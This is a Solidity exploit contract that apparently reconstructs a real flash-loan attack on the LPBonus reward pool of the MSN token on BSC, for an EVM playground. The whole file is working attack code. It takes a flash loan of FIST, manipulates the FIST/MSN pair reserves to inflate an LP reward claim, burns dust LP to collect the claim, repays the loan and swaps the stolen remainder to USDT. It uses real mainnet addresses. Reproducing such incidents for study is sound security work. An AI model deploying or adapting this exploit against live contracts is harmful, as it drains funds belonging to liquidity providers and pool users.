// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// LPBonus (MSN token LP-reward pool) — reward accounting uses inconsistent MSN reserve
// values between fee ACCRUAL and LP WITHDRAWAL, letting a manipulated reserve inflate one
// LP position's FIST claim. BSC, block 124759921.
//
// Cheatcode-free reconstruction of the real attack tx
// 0xecac1563bbb76fb8fefb4a7da4592260a8c1ddde21d7da62b78a9e3769808e6b for the EVM Playground.
// The entry point is attack(); the real on-chain operations are reproduced verbatim as typed
// pair calls, so the MSN token's own hooks (userAddLP / BonusSEND / UserRemoveLp fired from
// inside MSN.transfer) run exactly as they did on-chain. Capital is sourced from the real
// USDT/FIST FstSwap flash-swap (fstswapCall callback). No cheatcodes, no privileged keys.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPair {
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract LPBonusExploit {
    IERC20 constant MSN = IERC20(0xD8B3EF86AFCE18EdbA91fED481ABE22F173597C1);
    IERC20 constant FIST = IERC20(0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPair constant PAIR = IPair(0xDD95c8a545E98D2C6De4D20aBCC44b104da1E6E5); // FIST/MSN (token0=FIST, token1=MSN)
    IPair constant FSTSWAP = IPair(0xb4Ec801aED8C92F2E69589518AAa127afb37d8C9); // USDT/FIST (token0=USDT, token1=FIST)
    address constant LPB = 0x52272524A22f941f5489c1233732797314BB054b; // LPBonus reward pool

    uint256 constant FLASH_FIST = 13_481_395_302739; // 13,481,395.302739 FIST (real in-tx flash amount)

    uint256 public claimedReward; // FIST paid out by UserRemoveLp (the inflated claim)
    uint256 public fundedReward; // FIST actually funded into LPBonus by the accrual

    // Entry point. Flash-borrow FIST, run the exploit in the callback, then realize profit in USDT.
    function attack() external {
        // Flash-borrow FIST from the USDT/FIST FstSwap pair (token1 = FIST). Non-empty data => fstswapCall.
        FSTSWAP.swap(0, FLASH_FIST, address(this), hex"01");

        // Convert leftover stolen FIST to USDT (exactly as the real tx did), realizing profit in USDT.
        uint256 leftFist = FIST.balanceOf(address(this));
        if (leftFist > 0) {
            (uint112 u, uint112 f,) = FSTSWAP.getReserves();
            FIST.transfer(address(FSTSWAP), leftFist);
            uint256 outUsdt = (uint256(leftFist) * 997 * u) / (uint256(f) * 1000 + uint256(leftFist) * 997);
            FSTSWAP.swap(outUsdt, 0, address(this), "");
        }
    }

    function fstswapCall(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(FSTSWAP), "only fstswap");

        // step 1: buy ~140 MSN off the pair (FIST -> MSN); MSN's 2% transfer fee leaves us ~140 net.
        _pairSwap(address(FIST), 539_710_857353);

        // step 2: add 140 MSN + FIST as liquidity -> MSN fires userAddLP, registering our position (reserve ~501).
        FIST.transfer(address(PAIR), 736_684_445385);
        MSN.transfer(address(PAIR), 140 ether);
        PAIR.mint(address(this));

        // step 3: dump 12,200,000 FIST -> crush the MSN reserve to ~89.33.
        uint256 fistBeforeAccrual = FIST.balanceOf(LPB);
        _pairSwap(address(FIST), 12_200_000_000000);

        // step 4: sell all held MSN back -> raise the reserve to ~491.11. The MSN moved by this swap fires
        //         BonusSEND, which funds FIST into LPBonus and inflates oneshareFIST against the ~89 reserve.
        _pairSwap(address(MSN), MSN.balanceOf(address(this)));
        fundedReward = FIST.balanceOf(LPB) - fistBeforeAccrual;

        // step 5a: burn a DUST amount of LP while the reserve is still ~491. The tiny MSN leaving the pair to
        //          us fires UserRemoveLp, which settles the FULL inflated CalcPendingUser claim in FIST.
        uint256 fistBeforeClaim = FIST.balanceOf(address(this));
        PAIR.transfer(address(PAIR), 40_372);
        PAIR.burn(address(this));
        claimedReward = FIST.balanceOf(address(this)) - fistBeforeClaim;

        // step 5b: burn the rest of the position for its underlying.
        uint256 lp = PAIR.balanceOf(address(this));
        PAIR.transfer(address(PAIR), lp);
        PAIR.burn(address(this));

        // step 6: sell the leftover MSN back to FIST.
        if (MSN.balanceOf(address(this)) > 0) _pairSwap(address(MSN), MSN.balanceOf(address(this)));

        // step 7: repay the flash loan (0.3% fee on FstSwap).
        FIST.transfer(address(FSTSWAP), (FLASH_FIST * 1000) / 997 + 1);
    }

    // Direct pair swap. Sends `sendAmt` of tokenIn to the pair, sizes the output from the pair's ACTUAL
    // post-hook balance (so MSN's transfer fee is handled) at the pair's 0.25% fee. token0=FIST, token1=MSN.
    function _pairSwap(address tokenIn, uint256 sendAmt) internal returns (uint256 out) {
        IERC20(tokenIn).transfer(address(PAIR), sendAmt);
        (uint112 r0, uint112 r1,) = PAIR.getReserves(); // r0 = FIST, r1 = MSN
        if (tokenIn == address(FIST)) {
            uint256 realIn = FIST.balanceOf(address(PAIR)) - r0;
            out = (realIn * 9975 * r1) / (uint256(r0) * 10000 + realIn * 9975); // MSN out
            PAIR.swap(0, out, address(this), "");
        } else {
            uint256 realIn = MSN.balanceOf(address(PAIR)) - r1;
            out = (realIn * 9975 * r0) / (uint256(r1) * 10000 + realIn * 9975); // FIST out
            PAIR.swap(out, 0, address(this), "");
        }
    }
}
